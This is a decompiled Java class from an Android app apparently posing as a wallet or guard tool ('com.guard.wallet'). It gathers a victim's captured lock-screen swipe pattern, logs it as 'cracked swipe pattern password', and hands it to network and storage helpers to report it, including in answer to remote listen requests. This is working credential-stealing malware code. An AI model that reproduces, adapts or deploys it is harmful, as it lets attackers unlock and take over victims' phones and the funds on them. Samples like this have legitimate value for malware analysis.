package com.guard.wallet.plug;

import a1.AbstractC0026q;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.RespCipherStateVO;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.Serializable;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicReference;

/* renamed from: com.guard.wallet.plug.d */
/* loaded from: classes.dex */
public final class C0225d implements Serializable {

    /* renamed from: b */
    public ReqListenHelper f269b;

    /* renamed from: a */
    public final LinkedList f268a = new LinkedList();

    /* renamed from: c */
    public final AtomicReference f270c = new AtomicReference(null);

    /* renamed from: a */
    public final void m455a() {
        ReqListenHelper reqListenHelper = this.f269b;
        AtomicReference atomicReference = this.f270c;
        LinkedList linkedList = this.f268a;
        if (reqListenHelper != null && !linkedList.isEmpty()) {
            if (Objects.equals(this.f269b.getListenType(), 1)) {
                ReqUnlockDeviceVO reqUnlockDeviceVO = new ReqUnlockDeviceVO();
                reqUnlockDeviceVO.setPatternCipher(new LinkedList());
                reqUnlockDeviceVO.getPatternCipher().addAll(linkedList);
                reqUnlockDeviceVO.setCipherGradeCode("PASSWORD_QUALITY_PATTERN");
                Log.d("com.guard.wallet.plug.d", "已破解滑动图案密码:" + reqUnlockDeviceVO);
                Log.d("com.guard.wallet.plug.d", "Lock Cipher:" + reqUnlockDeviceVO);
                AbstractC0252h.m682C(reqUnlockDeviceVO);
                AbstractC0207l.m414B(reqUnlockDeviceVO);
                if (MainApplication.getInstance() != null && !AbstractC0026q.m151B(atomicReference.get())) {
                    MainApplication.getInstance().offerStrategyEvent((String) atomicReference.get());
                }
            } else {
                RespCipherStateVO respCipherStateVO = new RespCipherStateVO();
                respCipherStateVO.setListenType(this.f269b.getListenType());
                respCipherStateVO.setListenId(this.f269b.getListenId());
                respCipherStateVO.setSubscribeId(this.f269b.getSubscribeId());
                respCipherStateVO.setCipherGradeCode("PASSWORD_QUALITY_PATTERN");
                respCipherStateVO.setPatternCipher(new LinkedList());
                respCipherStateVO.getPatternCipher().addAll(linkedList);
                AbstractC0207l.m415C(respCipherStateVO);
            }
        }
        atomicReference.set(null);
        linkedList.clear();
    }
}
